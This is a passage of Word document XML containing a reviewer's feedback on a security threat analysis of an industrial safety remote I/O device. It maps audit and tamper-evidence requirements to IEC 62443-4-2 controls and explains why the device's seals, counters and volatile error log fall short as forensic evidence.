                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>non-safety (QM)</w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> and </w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>cleared on cold start</w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (SRIO-6521) — the evidence itself is neither integrity-protected nor persistent, so it fails as forensic evidence.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00271C74" w:rsidRPr="00CB35D8" w14:paraId="31CF6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74C40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 xml:space="preserve">CR 6.1 – Audit-log </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>accessibility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51EC6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❌</w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74"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A5E81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rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>➕</w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Add — and this one is (partially) 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86D20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The Error Log </w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>is readable via IoT-Core</w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (SRIO-10662/15221). Credit this as the one genuinely satisfied sub-capability.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00271C74" w:rsidRPr="00CB35D8" w14:paraId="49731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ECA8E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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>EDR 2.13 / CR 2.13 – Use of physical diagnostic &amp; test interfaces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DA537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❌</w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74"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82417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➕</w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>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D82E3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This is the correct home for your </w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>debug/test-port</w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> point (below), not CR 2.8.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5ED18182" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Corrected mapping:</w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> RQ-003 → EHSR 1.1.9 §2 →</w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>{CR 2.8, CR 2.9, CR 2.10, CR 2.11, CR 2.12, CR 3.9, CR 6.1, EDR 3.11 (detection limb), EDR 2.13}</w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:hyperlink r:id="rId48" w:history="1">
        <w:r w:rsidRPr="00271C74">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve">[IEC62443_4_2_source | </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00271C74">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Txt</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00271C74">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>]</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00271C74">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:hyperlink r:id="rId49" w:history="1">
        <w:r w:rsidRPr="00271C74">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00271C74">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00271C74">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="26623A76" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00271C74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782"/>
        <w:gridCol w:w="6158"/>
      </w:tblGrid>
      <w:tr w:rsidR="00271C74" w:rsidRPr="00271C74" w14:paraId="41A23E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69795E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61BCF9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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Your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9B94A4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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Verdict</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00271C74" w:rsidRPr="00271C74" w14:paraId="0B982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41045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Asset G – Physical F-address/OP-mode interface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0CD35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D2F30" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">Correct — and doubly relevant: the rotary switch sets the </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>F_Dest_Add</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>and</w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> at value 999 enters firmware-update mode (SRIO-2013). </w:t>
            </w:r>
            <w:hyperlink r:id="rId50" w:history="1">
              <w:r w:rsidRPr="00271C74">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>[100_SRIO_P...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00271C74">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>e_RemoteIO</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00271C74">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t xml:space="preserve"> | PDF]</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00271C74" w:rsidRPr="00271C74" w14:paraId="5342B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F5438" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00271C74">
              <w:lastRenderedPageBreak/>
              <w:t>Asset I – Audit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EE77F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3D657" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">Correct — but note the candidate store (COM Error Log) is </w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>non-safety and volatile across cold start</w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">. </w:t>
            </w:r>
            <w:hyperlink r:id="rId51" w:history="1">
              <w:r w:rsidRPr="00271C74">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>[209_SRIO_C...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00271C74">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>e_RemoteIO</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00271C74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410CC37F" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>STRIDE — Repudiation is correct and primary.</w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:t xml:space="preserve">Add </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00271C74">
        <w:t>one</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00271C74">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00271C74">
        <w:t>note</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00271C74">
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21B4B5D5" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>➕</w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Tampering (on the audit asset itself).</w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Because the log is unprotected and </w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>cold-start clears it</w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, an attacker can </w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>erase</w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> evidence by forcing a power cycle — an anti-forensic Tampering vector against Asset I (this is why </w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>CR 3.9</w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> must be in the map). MITRE ATT&amp;CK for ICS frames this as </w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">T0872 </w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Indicator Removal on Host</w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CB065ED" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>1.3 Security Functions &amp; Gaps — Cross-Referenced</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0642FBC2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Your stated mitigation ("seal + visual inspection only, no automatic tamper logging") is </w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>accurate for physical tamper</w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, but you have </w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>understated what the device does collect</w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. A defensible thesis must enumerate these </w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>partial</w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> mechanisms and then show why each is insufficient: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663"/>
        <w:gridCol w:w="1404"/>
        <w:gridCol w:w="2831"/>
      </w:tblGrid>
      <w:tr w:rsidR="00271C74" w:rsidRPr="00CB35D8" w14:paraId="194621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C0FFF7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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Mechanism</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>some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you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missed</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00271C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28934D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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Documentation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A7D262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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>What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it</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>evidences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3EB22C" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Why it still fails RQ-003</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00271C74" w:rsidRPr="00271C74" w14:paraId="5DBAE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2564B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t>Physical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seals</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00271C74">
              <w:t xml:space="preserve"> (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74">
              <w:t>plastic</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00271C74">
              <w:t xml:space="preserve"> E12839 / </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74">
              <w:t>metal</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00271C74">
              <w:t xml:space="preserve"> E12542)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54A85" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00271C74">
              <w:t>SRIO-2102/11001/11000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8B0E6" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00271C74">
              <w:t xml:space="preserve">Visual </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74">
              <w:t>resistance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74691" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">No electronic record; exists for </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>moulding</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">/IP, not security. </w:t>
            </w:r>
            <w:hyperlink r:id="rId52" w:history="1">
              <w:r w:rsidRPr="00271C74">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>[</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00271C74">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>Market_Acc</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00271C74">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00271C74">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>ty_Systems</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00271C74">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t xml:space="preserve"> | PDF]</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00271C74" w:rsidRPr="00CB35D8" w14:paraId="40A73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400A1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Rotary switch </w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">read only at </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/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91408" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00271C74">
              <w:t>SRIO-8803, SRIO-10812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22DD5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Temporal protection (change ignored during OPERATE)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4FD53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Partial </w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>resistance</w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">, generates </w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>no evidence</w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">. </w:t>
            </w:r>
            <w:hyperlink r:id="rId53" w:history="1">
              <w:r w:rsidRPr="00271C74">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>[</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00271C74">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>Market_Acc</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00271C74">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00271C74">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>ty_Systems</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00271C74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271C74" w:rsidRPr="00271C74" w14:paraId="71D2F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108D7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rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>➕</w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>I&amp;M0 REVISION_COUNTER</w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (increments on each parameter change)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D09AD" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00271C74">
              <w:t>SRIO-3002/3015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92F6D" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00271C74">
              <w:t xml:space="preserve">Count </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74">
              <w:t>of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configuration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interventions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D52EB" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">Counter only — </w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>no who/when/what</w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">, no timestamp, wraps at 0xFFFF; useless for physical switch tamper. </w:t>
            </w:r>
            <w:hyperlink r:id="rId54" w:history="1">
              <w:r w:rsidRPr="00271C74">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>[209_SRIO_C...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00271C74">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>e_RemoteIO</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00271C74">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t xml:space="preserve"> | PDF]</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00271C74" w:rsidRPr="00271C74" w14:paraId="6E921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046B4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➕</w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve">I&amp;M4 </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>signature</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00271C74">
              <w:t xml:space="preserve"> (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74">
              <w:t>F_iParCRC</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00271C74">
              <w:t xml:space="preserve"> + </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00271C74">
              <w:t>F_Par_CRC</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
